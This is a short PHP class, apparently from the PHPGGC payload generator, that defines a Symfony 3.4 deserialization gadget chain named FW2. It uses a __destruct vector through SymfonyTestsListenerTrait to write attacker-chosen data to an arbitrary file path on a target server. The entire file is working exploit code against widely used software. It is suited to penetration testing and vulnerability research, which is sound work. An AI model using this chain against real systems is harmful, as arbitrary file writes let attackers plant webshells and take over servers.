<?php

namespace GadgetChain\Symfony;

class FW2 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '3.4';
    public static $vector = '__destruct';
    public static $author = 'RicterZ';

    public function generate(array $parameters)
    {
    	$path = $parameters['remote_path'];
    	$data = $parameters['data'];
    	return new \Symfony\Bridge\PhpUnit\Legacy\SymfonyTestsListenerTrait(
    		$path,
    		$data
    	);
    }
}